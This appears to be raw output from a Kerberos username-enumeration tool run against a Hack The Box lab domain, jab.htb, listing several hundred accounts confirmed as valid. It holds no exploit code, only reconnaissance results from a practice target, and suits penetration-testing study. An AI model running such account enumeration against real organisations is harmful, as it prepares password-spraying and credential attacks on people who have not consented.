+2024/03/07 13:56:57 &gt;  [+] VALID USERNAME:       mberry@jab.htb
+2024/03/07 13:56:58 &gt;  [+] VALID USERNAME:       lwright@jab.htb
+2024/03/07 13:56:58 &gt;  [+] VALID USERNAME:       lmorris@jab.htb
+2024/03/07 13:56:58 &gt;  [+] VALID USERNAME:       lgray@jab.htb
+2024/03/07 13:57:00 &gt;  [+] VALID USERNAME:       kfisher@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jward@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jtodd@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jterry@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jsims@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jrusso@jab.htb
+2024/03/07 13:57:01 &gt;  [+] VALID USERNAME:       jsanders@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jmurray@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jlucas@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jlarson@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jhughes@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jhoward@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jhill@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jhernandez@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jgriffin@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jgoodwin@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jfox@jab.htb
+2024/03/07 13:57:02 &gt;  [+] VALID USERNAME:       jedwards@jab.htb
+2024/03/07 13:57:03 &gt;  [+] VALID USERNAME:       jdixon@jab.htb
+2024/03/07 13:57:03 &gt;  [+] VALID USERNAME:       jcooley@jab.htb
+2024/03/07 13:57:03 &gt;  [+] VALID USERNAME:       jbryant@jab.htb
+2024/03/07 13:57:05 &gt;  [+] VALID USERNAME:       gwarren@jab.htb
+2024/03/07 13:57:06 &gt;  [+] VALID USERNAME:       grandall@jab.htb
+2024/03/07 13:57:07 &gt;  [+] VALID USERNAME:       fstone@jab.htb
+2024/03/07 13:57:07 &gt;  [+] VALID USERNAME:       fsanchez@jab.htb
+2024/03/07 13:57:08 &gt;  [+] VALID USERNAME:       eyoung@jab.htb
+2024/03/07 13:57:09 &gt;  [+] VALID USERNAME:       ely@jab.htb
+2024/03/07 13:57:09 &gt;  [+] VALID USERNAME:       elarsen@jab.htb
+2024/03/07 13:57:09 &gt;  [+] VALID USERNAME:       dyates@jab.htb
+2024/03/07 13:57:10 &gt;  [+] VALID USERNAME:       dmurphy@jab.htb
+2024/03/07 13:57:10 &gt;  [+] VALID USERNAME:       dgross@jab.htb
+2024/03/07 13:57:10 &gt;  [+] VALID USERNAME:       dharper@jab.htb
+2024/03/07 13:57:10 &gt;  [+] VALID USERNAME:       dgrant@jab.htb
+2024/03/07 13:57:10 &gt;  [+] VALID USERNAME:       dflint@jab.htb
+2024/03/07 13:57:11 &gt;  [+] VALID USERNAME:       dbell@jab.htb
+2024/03/07 13:57:11 &gt;  [+] VALID USERNAME:       cwood@jab.htb
+2024/03/07 13:57:11 &gt;  [+] VALID USERNAME:       cward@jab.htb
+2024/03/07 13:57:12 &gt;  [+] VALID USERNAME:       cnorris@jab.htb
+2024/03/07 13:57:13 &gt;  [+] VALID USERNAME:       cfoster@jab.htb
+2024/03/07 13:57:13 &gt;  [+] VALID USERNAME:       cflores@jab.htb
+2024/03/07 13:57:13 &gt;  [+] VALID USERNAME:       canderson@jab.htb
+2024/03/07 13:57:13 &gt;  [+] VALID USERNAME:       calvarez@jab.htb
+2024/03/07 13:57:13 &gt;  [+] VALID USERNAME:       bwood@jab.htb
+2024/03/07 13:57:16 &gt;  [+] VALID USERNAME:       bbonds@jab.htb
+2024/03/07 13:57:16 &gt;  [+] VALID USERNAME:       banderson@jab.htb
+2024/03/07 13:57:17 &gt;  [+] VALID USERNAME:       awarren@jab.htb
+2024/03/07 13:57:17 &gt;  [+] VALID USERNAME:       atay@jab.htb
+2024/03/07 13:57:18 &gt;  [+] VALID USERNAME:       amoore@jab.htb
+2024/03/07 13:57:18 &gt;  [+] VALID USERNAME:       alacey@jab.htb
+2024/03/07 13:57:19 &gt;  [+] VALID USERNAME:       ahall@jab.htb
+2024/03/07 13:57:20 &gt;  [+] VALID USERNAME:       Sanderson@jab.htb
+2024/03/07 13:57:22 &gt;  [+] VALID USERNAME:       JWhite@jab.htb
+2024/03/07 13:57:22 &gt;  [+] VALID USERNAME:       JPierre@jab.htb
+2024/03/07 13:57:22 &gt;  [+] VALID USERNAME:       JMorris@jab.htb
+2024/03/07 13:57:31 &gt;  [+] VALID USERNAME:       wadams@jab.htb
+2024/03/07 13:57:31 &gt;  [+] VALID USERNAME:       twagner@jab.htb
+2024/03/07 13:57:34 &gt;  [+] VALID USERNAME:       tgreen@jab.htb
+2024/03/07 13:57:35 &gt;  [+] VALID USERNAME:       swells@jab.htb
+2024/03/07 13:57:40 &gt;  [+] VALID USERNAME:       scook@jab.htb
+2024/03/07 13:57:42 &gt;  [+] VALID USERNAME:       rwalsh@jab.htb
+2024/03/07 13:57:42 &gt;  [+] VALID USERNAME:       rstewart@jab.htb
+2024/03/07 13:57:43 &gt;  [+] VALID USERNAME:       rikard@jab.htb
+2024/03/07 13:57:44 &gt;  [+] VALID USERNAME:       rcarlson@jab.htb
+2024/03/07 13:57:44 &gt;  [+] VALID USERNAME:       rbailey@jab.htb
+2024/03/07 13:57:45 &gt;  [+] VALID USERNAME:       pwright@jab.htb
+2024/03/07 13:57:47 &gt;  [+] VALID USERNAME:       phenry@jab.htb
+2024/03/07 13:57:48 &gt;  [+] VALID USERNAME:       pcarroll@jab.htb
+2024/03/07 13:57:51 &gt;  [+] VALID USERNAME:       mwilliams@jab.htb
+2024/03/07 13:57:51 &gt;  [+] VALID USERNAME:       mwagner@jab.htb
+2024/03/07 13:57:51 &gt;  [+] VALID USERNAME:       mrice@jab.htb
+2024/03/07 13:57:52 &gt;  [+] VALID USERNAME:       mmorris@jab.htb
+2024/03/07 13:57:52 &gt;  [+] VALID USERNAME:       mmorgan@jab.htb
+2024/03/07 13:57:52 &gt;  [+] VALID USERNAME:       mmills@jab.htb
+2024/03/07 13:57:53 &gt;  [+] VALID USERNAME:       mjason@jab.htb
+2024/03/07 13:57:53 &gt;  [+] VALID USERNAME:       mharrison@jab.htb
+2024/03/07 13:57:53 &gt;  [+] VALID USERNAME:       mgonzalez@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       mfrost@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       medwards@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       mcarroll@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       mbryant@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       mbryan@jab.htb
+2024/03/07 13:57:54 &gt;  [+] VALID USERNAME:       mbarker@jab.htb
+2024/03/07 13:57:56 &gt;  [+] VALID USERNAME:       maho@jab.htb
+2024/03/07 13:57:57 &gt;  [+] VALID USERNAME:       lthomas@jab.htb
+2024/03/07 13:57:57 &gt;  [+] VALID USERNAME:       lpalmer@jab.htb
+2024/03/07 13:57:57 &gt;  [+] VALID USERNAME:       lmitchell@jab.htb
+2024/03/07 13:57:58 &gt;  [+] VALID USERNAME:       lhoward@jab.htb
+2024/03/07 13:57:58 &gt;  [+] VALID USERNAME:       lbrown@jab.htb
+2024/03/07 13:57:58 &gt;  [+] VALID USERNAME:       laustin@jab.htb
+2024/03/07 13:57:59 &gt;  [+] VALID USERNAME:       kwright@jab.htb
+2024/03/07 13:57:59 &gt;  [+] VALID USERNAME:       krogers@jab.htb
+2024/03/07 13:58:00 &gt;  [+] VALID USERNAME:       kgilbert@jab.htb
+2024/03/07 13:58:01 &gt;  [+] VALID USERNAME:       kbeck@jab.htb
+2024/03/07 13:58:01 &gt;  [+] VALID USERNAME:       jwells@jab.htb
+2024/03/07 13:58:01 &gt;  [+] VALID USERNAME:       jwelch@jab.htb
+2024/03/07 13:58:02 &gt;  [+] VALID USERNAME:       jrivera@jab.htb
+2024/03/07 13:58:02 &gt;  [+] VALID USERNAME:       jreynolds@jab.htb
+2024/03/07 13:58:02 &gt;  [+] VALID USERNAME:       jpierre@jab.htb
+2024/03/07 13:58:03 &gt;  [+] VALID USERNAME:       jmay@jab.htb
+2024/03/07 13:58:03 &gt;  [+] VALID USERNAME:       jlawrence@jab.htb
+2024/03/07 13:58:03 &gt;  [+] VALID USERNAME:       jlane@jab.htb
+2024/03/07 13:58:03 &gt;  [+] VALID USERNAME:       jjacobs@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jhuff@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jholt@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jharper@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jhart@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jcarroll@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jcarlson@jab.htb
+2024/03/07 13:58:04 &gt;  [+] VALID USERNAME:       jbruce@jab.htb
+2024/03/07 13:58:05 &gt;  [+] VALID USERNAME:       jaguilar@jab.htb
+2024/03/07 13:58:08 &gt;  [+] VALID USERNAME:       hjones@jab.htb
+2024/03/07 13:58:12 &gt;  [+] VALID USERNAME:       ghunter@jab.htb
+2024/03/07 13:58:12 &gt;  [+] VALID USERNAME:       gblack@jab.htb
+2024/03/07 13:58:14 &gt;  [+] VALID USERNAME:       fjohnson@jab.htb
+2024/03/07 13:58:16 &gt;  [+] VALID USERNAME:       ewalter@jab.htb
+2024/03/07 13:58:17 &gt;  [+] VALID USERNAME:       dsnyder@jab.htb
+2024/03/07 13:58:18 &gt;  [+] VALID USERNAME:       dpayne@jab.htb
+2024/03/07 13:58:18 &gt;  [+] VALID USERNAME:       dmcgee@jab.htb
+2024/03/07 13:58:18 &gt;  [+] VALID USERNAME:       dmclean@jab.htb
+2024/03/07 13:58:19 &gt;  [+] VALID USERNAME:       dlarsen@jab.htb
+2024/03/07 13:58:19 &gt;  [+] VALID USERNAME:       dhowell@jab.htb
+2024/03/07 13:58:19 &gt;  [+] VALID USERNAME:       dhicks@jab.htb
+2024/03/07 13:58:19 &gt;  [+] VALID USERNAME:       dgreene@jab.htb
+2024/03/07 13:58:19 &gt;  [+] VALID USERNAME:       dford@jab.htb
+2024/03/07 13:58:20 &gt;  [+] VALID USERNAME:       ddodson@jab.htb
+2024/03/07 13:58:20 &gt;  [+] VALID USERNAME:       ddick@jab.htb
+2024/03/07 13:58:21 &gt;  [+] VALID USERNAME:       dannis@jab.htb
+2024/03/07 13:58:22 &gt;  [+] VALID USERNAME:       cpowell@jab.htb
+2024/03/07 13:58:23 &gt;  [+] VALID USERNAME:       cmaxwell@jab.htb
+2024/03/07 13:58:23 &gt;  [+] VALID USERNAME:       ckent@jab.htb
+2024/03/07 13:58:25 &gt;  [+] VALID USERNAME:       cevans@jab.htb
+2024/03/07 13:58:25 &gt;  [+] VALID USERNAME:       cdunn@jab.htb
+2024/03/07 13:58:25 &gt;  [+] VALID USERNAME:       ccox@jab.htb
+2024/03/07 13:58:25 &gt;  [+] VALID USERNAME:       cbennett@jab.htb
+2024/03/07 13:58:25 &gt;  [+] VALID USERNAME:       cbailey@jab.htb
+2024/03/07 13:58:27 &gt;  [+] VALID USERNAME:       bstark@jab.htb
+2024/03/07 13:58:28 &gt;  [+] VALID USERNAME:       bolden@jab.htb
+2024/03/07 13:58:30 &gt;  [+] VALID USERNAME:       bhogan@jab.htb
+2024/03/07 13:58:30 &gt;  [+] VALID USERNAME:       bhill@jab.htb
+2024/03/07 13:58:30 &gt;  [+] VALID USERNAME:       bbell@jab.htb
+2024/03/07 13:58:31 &gt;  [+] VALID USERNAME:       bbecker@jab.htb
+2024/03/07 13:58:32 &gt;  [+] VALID USERNAME:       ataylor@jab.htb
+2024/03/07 13:58:32 &gt;  [+] VALID USERNAME:       astevens@jab.htb
+2024/03/07 13:58:33 &gt;  [+] VALID USERNAME:       apeters@jab.htb
+2024/03/07 13:58:34 &gt;  [+] VALID USERNAME:       amurphy@jab.htb
+2024/03/07 13:58:34 &gt;  [+] VALID USERNAME:       amercer@jab.htb
+2024/03/07 13:58:34 &gt;  [+] VALID USERNAME:       akelly@jab.htb
+2024/03/07 13:58:35 &gt;  [+] VALID USERNAME:       acampbell@jab.htb
+2024/03/07 13:58:40 &gt;  [+] VALID USERNAME:       Jbrown@jab.htb
+2024/03/07 13:58:41 &gt;  [+] VALID USERNAME:       JSmith@jab.htb
+2024/03/07 13:58:42 &gt;  [+] VALID USERNAME:       Fsmith@jab.htb
+2024/03/07 13:58:42 &gt;  [+] VALID USERNAME:       Ely@jab.htb
+2024/03/07 13:58:43 &gt;  [+] VALID USERNAME:       DSanchez@jab.htb
+2024/03/07 13:58:43 &gt;  [+] VALID USERNAME:       DSMITH@jab.htb
+2024/03/07 13:58:44 &gt;  [+] VALID USERNAME:       Bcobb@jab.htb
+2024/03/07 13:58:54 &gt;  [+] VALID USERNAME:       whicks@jab.htb
+2024/03/07 13:58:54 &gt;  [+] VALID USERNAME:       warcher@jab.htb
+2024/03/07 13:58:56 &gt;  [+] VALID USERNAME:       tware@jab.htb
+2024/03/07 13:59:02 &gt;  [+] VALID USERNAME:       tedwards@jab.htb
+2024/03/07 13:59:04 &gt;  [+] VALID USERNAME:       tadams@jab.htb
+2024/03/07 13:59:07 &gt;  [+] VALID USERNAME:       srogers@jab.htb
+2024/03/07 13:59:07 &gt;  [+] VALID USERNAME:       srosen@jab.htb
+2024/03/07 13:59:07 &gt;  [+] VALID USERNAME:       spowell@jab.htb
+2024/03/07 13:59:08 &gt;  [+] VALID USERNAME:       spare@jab.htb
+2024/03/07 13:59:09 &gt;  [+] VALID USERNAME:       snguyen@jab.htb
+2024/03/07 13:59:13 &gt;  [+] VALID USERNAME:       sgodfrey@jab.htb
+2024/03/07 13:59:14 &gt;  [+] VALID USERNAME:       scross@jab.htb
+2024/03/07 13:59:14 &gt;  [+] VALID USERNAME:       scox@jab.htb
+2024/03/07 13:59:15 &gt;  [+] VALID USERNAME:       sbradley@jab.htb
+2024/03/07 13:59:15 &gt;  [+] VALID USERNAME:       sbruce@jab.htb
+2024/03/07 13:59:18 &gt;  [+] VALID USERNAME:       rrobinson@jab.htb
+2024/03/07 13:59:18 &gt;  [+] VALID USERNAME:       rowens@jab.htb
+2024/03/07 13:59:19 &gt;  [+] VALID USERNAME:       rnelson@jab.htb
+2024/03/07 13:59:20 &gt;  [+] VALID USERNAME:       rmarsh@jab.htb
+2024/03/07 13:59:20 &gt;  [+] VALID USERNAME:       rknox@jab.htb
+2024/03/07 13:59:20 &gt;  [+] VALID USERNAME:       rhoward@jab.htb
+2024/03/07 13:59:21 &gt;  [+] VALID USERNAME:       rfields@jab.htb
+2024/03/07 13:59:22 &gt;  [+] VALID USERNAME:       rdavid@jab.htb
+2024/03/07 13:59:22 &gt;  [+] VALID USERNAME:       randrews@jab.htb
+2024/03/07 13:59:24 &gt;  [+] VALID USERNAME:       pwatson@jab.htb
+2024/03/07 13:59:25 &gt;  [+] VALID USERNAME:       primmer@jab.htb
+2024/03/07 13:59:25 &gt;  [+] VALID USERNAME:       plopez@jab.htb
+2024/03/07 13:59:27 &gt;  [+] VALID USERNAME:       pfletcher@jab.htb
+2024/03/07 13:59:32 &gt;  [+] VALID USERNAME:       nperez@jab.htb
+2024/03/07 13:59:34 &gt;  [+] VALID USERNAME:       nbaker@jab.htb
+2024/03/07 13:59:35 &gt;  [+] VALID USERNAME:       mwelch@jab.htb
+2024/03/07 13:59:35 &gt;  [+] VALID USERNAME:       mvogel@jab.htb
+2024/03/07 13:59:35 &gt;  [+] VALID USERNAME:       mvelez@jab.htb
+2024/03/07 13:59:35 &gt;  [+] VALID USERNAME:       mvaughn@jab.htb
+2024/03/07 13:59:36 &gt;  [+] VALID USERNAME:       mthompson@jab.htb
+2024/03/07 13:59:36 &gt;  [+] VALID USERNAME:       mrobertson@jab.htb
+2024/03/07 13:59:37 &gt;  [+] VALID USERNAME:       mparks@jab.htb
+2024/03/07 13:59:38 &gt;  [+] VALID USERNAME:       mmcallister@jab.htb
+2024/03/07 13:59:40 &gt;  [+] VALID USERNAME:       mhurst@jab.htb
+2024/03/07 13:59:40 &gt;  [+] VALID USERNAME:       mestes@jab.htb
+2024/03/07 13:59:41 &gt;  [+] VALID USERNAME:       mcohen@jab.htb
+2024/03/07 13:59:42 &gt;  [+] VALID USERNAME:       mburgess@jab.htb
+2024/03/07 13:59:42 &gt;  [+] VALID USERNAME:       mbradley@jab.htb
+2024/03/07 13:59:42 &gt;  [+] VALID USERNAME:       mblake@jab.htb
+2024/03/07 13:59:44 &gt;  [+] VALID USERNAME:       mandrews@jab.htb
+2024/03/07 13:59:46 &gt;  [+] VALID USERNAME:       lsanders@jab.htb
+2024/03/07 13:59:46 &gt;  [+] VALID USERNAME:       lramirez@jab.htb
+2024/03/07 13:59:48 &gt;  [+] VALID USERNAME:       lharris@jab.htb
+2024/03/07 13:59:48 &gt;  [+] VALID USERNAME:       lhill@jab.htb
+2024/03/07 13:59:48 &gt;  [+] VALID USERNAME:       lfoster@jab.htb
+2024/03/07 13:59:49 &gt;  [+] VALID USERNAME:       leaton@jab.htb
+2024/03/07 13:59:49 &gt;  [+] VALID USERNAME:       ldawson@jab.htb
+2024/03/07 13:59:52 &gt;  [+] VALID USERNAME:       kreed@jab.htb
+2024/03/07 13:59:53 &gt;  [+] VALID USERNAME:       kmorris@jab.htb
+2024/03/07 13:59:53 &gt;  [+] VALID USERNAME:       kmoss@jab.htb
+2024/03/07 13:59:56 &gt;  [+] VALID USERNAME:       kanderson@jab.htb
+2024/03/07 13:59:57 &gt;  [+] VALID USERNAME:       jtorres@jab.htb
+2024/03/07 13:59:57 &gt;  [+] VALID USERNAME:       jrussell@jab.htb
+2024/03/07 13:59:57 &gt;  [+] VALID USERNAME:       jrubio@jab.htb
+2024/03/07 13:59:58 &gt;  [+] VALID USERNAME:       jprince@jab.htb
+2024/03/07 14:00:00 &gt;  [+] VALID USERNAME:       jmcgee@jab.htb
+2024/03/07 14:00:00 &gt;  [+] VALID USERNAME:       jkeene@jab.htb
+2024/03/07 14:00:01 &gt;  [+] VALID USERNAME:       jhamilton@jab.htb
+2024/03/07 14:00:01 &gt;  [+] VALID USERNAME:       jhawkins@jab.htb
+2024/03/07 14:00:02 &gt;  [+] VALID USERNAME:       jfarmer@jab.htb
+2024/03/07 14:00:02 &gt;  [+] VALID USERNAME:       jeason@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jcombs@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jcastro@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jcannon@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jcampbell@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jboyd@jab.htb
+2024/03/07 14:00:03 &gt;  [+] VALID USERNAME:       jbarker@jab.htb
+2024/03/07 14:00:04 &gt;  [+] VALID USERNAME:       jalexander@jab.htb
+2024/03/07 14:00:06 &gt;  [+] VALID USERNAME:       ilee@jab.htb
+2024/03/07 14:00:11 &gt;  [+] VALID USERNAME:       handerson@jab.htb
+2024/03/07 14:00:11 &gt;  [+] VALID USERNAME:       gwheeler@jab.htb
+2024/03/07 14:00:11 &gt;  [+] VALID USERNAME:       gwatson@jab.htb
+2024/03/07 14:00:14 &gt;  [+] VALID USERNAME:       gnick@jab.htb
+2024/03/07 14:00:14 &gt;  [+] VALID USERNAME:       gmills@jab.htb
+2024/03/07 14:00:15 &gt;  [+] VALID USERNAME:       ghill@jab.htb
+2024/03/07 14:00:15 &gt;  [+] VALID USERNAME:       gflynn@jab.htb
+2024/03/07 14:00:16 &gt;  [+] VALID USERNAME:       gcollins@jab.htb
+2024/03/07 14:00:17 &gt;  [+] VALID USERNAME:       frontdesk@jab.htb
+2024/03/07 14:00:21 &gt;  [+] VALID USERNAME:       ewilliams@jab.htb
+2024/03/07 14:00:22 &gt;  [+] VALID USERNAME:       ethomas@jab.htb
+2024/03/07 14:00:23 &gt;  [+] VALID USERNAME:       emartin@jab.htb
+2024/03/07 14:00:24 &gt;  [+] VALID USERNAME:       eadams@jab.htb
+2024/03/07 14:00:24 &gt;  [+] VALID USERNAME:       dwatts@jab.htb
+2024/03/07 14:00:25 &gt;  [+] VALID USERNAME:       dtyler@jab.htb
+2024/03/07 14:00:25 &gt;  [+] VALID USERNAME:       dthompson@jab.htb
+2024/03/07 14:00:25 &gt;  [+] VALID USERNAME:       drice@jab.htb
+2024/03/07 14:00:25 &gt;  [+] VALID USERNAME:       dreyes@jab.htb
+2024/03/07 14:00:26 &gt;  [+] VALID USERNAME:       dramirez@jab.htb
+2024/03/07 14:00:29 &gt;  [+] VALID USERNAME:       dhinton@jab.htb
+2024/03/07 14:00:33 &gt;  [+] VALID USERNAME:       cwoods@jab.htb
+2024/03/07 14:00:34 &gt;  [+] VALID USERNAME:       cschultz@jab.htb
+2024/03/07 14:00:34 &gt;  [+] VALID USERNAME:       cperry@jab.htb
+2024/03/07 14:00:36 &gt;  [+] VALID USERNAME:       cmurphy@jab.htb
+2024/03/07 14:00:36 &gt;  [+] VALID USERNAME:       clove@jab.htb
+2024/03/07 14:00:39 &gt;  [+] VALID USERNAME:       cdillon@jab.htb
+2024/03/07 14:00:39 &gt;  [+] VALID USERNAME:       cdenton@jab.htb
+2024/03/07 14:00:39 &gt;  [+] VALID USERNAME:       ccole@jab.htb
+2024/03/07 14:00:39 &gt;  [+] VALID USERNAME:       cbridge@jab.htb
+2024/03/07 14:00:43 &gt;  [+] VALID USERNAME:       bturner@jab.htb
+2024/03/07 14:00:43 &gt;  [+] VALID USERNAME:       bsparks@jab.htb
+2024/03/07 14:00:44 &gt;  [+] VALID USERNAME:       bpeters@jab.htb
+2024/03/07 14:00:47 &gt;  [+] VALID USERNAME:       blee@jab.htb
+2024/03/07 14:00:50 &gt;  [+] VALID USERNAME:       belliott@jab.htb
+2024/03/07 14:00:53 &gt;  [+] VALID USERNAME:       atorres@jab.htb
+2024/03/07 14:00:54 &gt;  [+] VALID USERNAME:       asoto@jab.htb
+2024/03/07 14:00:54 &gt;  [+] VALID USERNAME:       aschneider@jab.htb
+2024/03/07 14:00:54 &gt;  [+] VALID USERNAME:       arivera@jab.htb
+2024/03/07 14:00:55 &gt;  [+] VALID USERNAME:       areed@jab.htb
+2024/03/07 14:00:55 &gt;  [+] VALID USERNAME:       aperry@jab.htb
+2024/03/07 14:00:57 &gt;  [+] VALID USERNAME:       amassey@jab.htb
+2024/03/07 14:00:58 &gt;  [+] VALID USERNAME:       alane@jab.htb
+2024/03/07 14:00:58 &gt;  [+] VALID USERNAME:       aking@jab.htb
+2024/03/07 14:00:59 &gt;  [+] VALID USERNAME:       ahenry@jab.htb
+2024/03/07 14:00:59 &gt;  [+] VALID USERNAME:       adoyle@jab.htb
+2024/03/07 14:01:00 &gt;  [+] VALID USERNAME:       abernard@jab.htb
+2024/03/07 14:01:04 &gt;  [+] VALID USERNAME:       SSMITH@jab.htb
+2024/03/07 14:01:05 &gt;  [+] VALID USERNAME:       RSMITH@jab.htb
+2024/03/07 14:01:08 &gt;  [+] VALID USERNAME:       MEdwards@jab.htb
+2024/03/07 14:01:10 &gt;  [+] VALID USERNAME:       Jdavis@jab.htb
+2024/03/07 14:01:10 &gt;  [+] VALID USERNAME:       JMartin@jab.htb
+2024/03/07 14:01:10 &gt;  [+] VALID USERNAME:       JJones@jab.htb
+2024/03/07 14:01:11 &gt;  [+] VALID USERNAME:       JHayes@jab.htb
+2024/03/07 14:01:13 &gt;  [+] VALID USERNAME:       Dwells@jab.htb
+2024/03/07 14:01:13 &gt;  [+] VALID USERNAME:       Dwilson@jab.htb
+2024/03/07 14:01:14 &gt;  [+] VALID USERNAME:       Dmurphy@jab.htb
+2024/03/07 14:01:15 &gt;  [+] VALID USERNAME:       DJones@jab.htb
+2024/03/07 14:01:15 &gt;  [+] VALID USERNAME:       Cmorris@jab.htb
+2024/03/07 14:01:16 &gt;  [+] VALID USERNAME:       Chill@jab.htb
+2024/03/07 14:01:18 &gt;  [+] VALID USERNAME:       BJONES@jab.htb
+2024/03/07 14:01:18 &gt;  [+] VALID USERNAME:       Asmith@jab.htb
+2024/03/07 14:01:32 &gt;  [+] VALID USERNAME:       wroberts@jab.htb
+2024/03/07 14:01:32 &gt;  [+] VALID USERNAME:       wnelson@jab.htb
+2024/03/07 14:01:40 &gt;  [+] VALID USERNAME:       tthompson@jab.htb
+2024/03/07 14:01:42 &gt;  [+] VALID USERNAME:       tpowell@jab.htb
+2024/03/07 14:01:48 &gt;  [+] VALID USERNAME:       thouston@jab.htb
+2024/03/07 14:01:48 &gt;  [+] VALID USERNAME:       thopkins@jab.htb
+2024/03/07 14:01:49 &gt;  [+] VALID USERNAME:       thodge@jab.htb
+2024/03/07 14:01:51 &gt;  [+] VALID USERNAME:       tgrant@jab.htb
+2024/03/07 14:01:51 &gt;  [+] VALID USERNAME:       tfoster@jab.htb
+2024/03/07 14:01:52 &gt;  [+] VALID USERNAME:       tellis@jab.htb
+2024/03/07 14:01:57 &gt;  [+] VALID USERNAME:       swest@jab.htb
+2024/03/07 14:02:09 &gt;  [+] VALID USERNAME:       smills@jab.htb
+2024/03/07 14:02:09 &gt;  [+] VALID USERNAME:       smcnabb@jab.htb
+2024/03/07 14:02:10 &gt;  [+] VALID USERNAME:       slane@jab.htb
+2024/03/07 14:02:16 &gt;  [+] VALID USERNAME:       sgrove@jab.htb
+2024/03/07 14:02:16 &gt;  [+] VALID USERNAME:       sgonzalez@jab.htb
+2024/03/07 14:02:16 &gt;  [+] VALID USERNAME:       sflynn@jab.htb
+2024/03/07 14:02:19 &gt;  [+] VALID USERNAME:       sdavila@jab.htb
+2024/03/07 14:02:21 &gt;  [+] VALID USERNAME:       scantor@jab.htb
+2024/03/07 14:02:21 &gt;  [+] VALID USERNAME:       scampbell@jab.htb
+2024/03/07 14:02:21 &gt;  [+] VALID USERNAME:       sbauer@jab.htb
+2024/03/07 14:02:22 &gt;  [+] VALID USERNAME:       sbaird@jab.htb
+2024/03/07 14:02:26 &gt;  [+] VALID USERNAME:       rwester@jab.htb
+2024/03/07 14:02:26 &gt;  [+] VALID USERNAME:       rward@jab.htb
+2024/03/07 14:02:26 &gt;  [+] VALID USERNAME:       rwallace@jab.htb
+2024/03/07 14:02:27 &gt;  [+] VALID USERNAME:       rsteele@jab.htb
+2024/03/07 14:02:28 &gt;  [+] VALID USERNAME:       rramirez@jab.htb
+2024/03/07 14:02:28 &gt;  [+] VALID USERNAME:       rpetty@jab.htb
+2024/03/07 14:02:28 &gt;  [+] VALID USERNAME:       rperry@jab.htb
+2024/03/07 14:02:28 &gt;  [+] VALID USERNAME:       rperez@jab.htb
+2024/03/07 14:02:32 &gt;  [+] VALID USERNAME:       rmerritt@jab.htb
+2024/03/07 14:02:32 &gt;  [+] VALID USERNAME:       rkirk@jab.htb
+2024/03/07 14:02:33 &gt;  [+] VALID USERNAME:       rjimenez@jab.htb
+2024/03/07 14:02:35 &gt;  [+] VALID USERNAME:       rholder@jab.htb
+2024/03/07 14:02:36 &gt;  [+] VALID USERNAME:       rgardner@jab.htb
+2024/03/07 14:02:36 &gt;  [+] VALID USERNAME:       rfloyd@jab.htb
+2024/03/07 14:02:39 &gt;  [+] VALID USERNAME:       rburgess@jab.htb
+2024/03/07 14:02:39 &gt;  [+] VALID USERNAME:       rbear@jab.htb
+2024/03/07 14:02:39 &gt;  [+] VALID USERNAME:       rbarrett@jab.htb
+2024/03/07 14:02:40 &gt;  [+] VALID USERNAME:       rarmstrong@jab.htb
+2024/03/07 14:02:44 &gt;  [+] VALID USERNAME:       pwhite@jab.htb
+2024/03/07 14:02:45 &gt;  [+] VALID USERNAME:       psimon@jab.htb
+2024/03/07 14:02:54 &gt;  [+] VALID USERNAME:       pellis@jab.htb
+2024/03/07 14:02:55 &gt;  [+] VALID USERNAME:       pbarnes@jab.htb
+2024/03/07 14:03:04 &gt;  [+] VALID USERNAME:       obrennan@jab.htb
+2024/03/07 14:03:05 &gt;  [+] VALID USERNAME:       ntucker@jab.htb
+2024/03/07 14:03:07 &gt;  [+] VALID USERNAME:       nmoore@jab.htb
+2024/03/07 14:03:08 &gt;  [+] VALID USERNAME:       nhall@jab.htb
+2024/03/07 14:03:10 &gt;  [+] VALID USERNAME:       nclark@jab.htb
+2024/03/07 14:03:13 &gt;  [+] VALID USERNAME:       mwilkinson@jab.htb
+2024/03/07 14:03:13 &gt;  [+] VALID USERNAME:       mwebb@jab.htb
+2024/03/07 14:03:13 &gt;  [+] VALID USERNAME:       mvachon@jab.htb
+2024/03/07 14:03:14 &gt;  [+] VALID USERNAME:       msullivan@jab.htb
+2024/03/07 14:03:15 &gt;  [+] VALID USERNAME:       mrichardson@jab.htb
+2024/03/07 14:03:16 &gt;  [+] VALID USERNAME:       mreilly@jab.htb
+2024/03/07 14:03:16 &gt;  [+] VALID USERNAME:       mpetit@jab.htb
